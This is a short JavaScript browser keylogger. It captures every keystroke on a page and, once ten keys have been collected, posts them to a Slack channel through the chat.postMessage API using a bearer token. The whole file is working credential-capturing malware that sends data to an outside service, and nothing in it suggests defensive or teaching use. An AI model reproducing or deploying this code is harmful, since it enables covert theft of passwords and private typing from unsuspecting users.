let log = [];
const token = "INSERT_API_KEY";

document.addEventListener('keydown', (event) => {
    
    log.push(event.key);

    if (log.length >= 10) {
        console.log(log);
        goPalantir(log);
        log = [];
    }
});

function goPalantir(load) {
    try {
        fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                channel: `C0BNS59V22V`,
                text: load,
            })
        })
    } catch (error) {
        console.log('failed to palantir 💔');
    };
};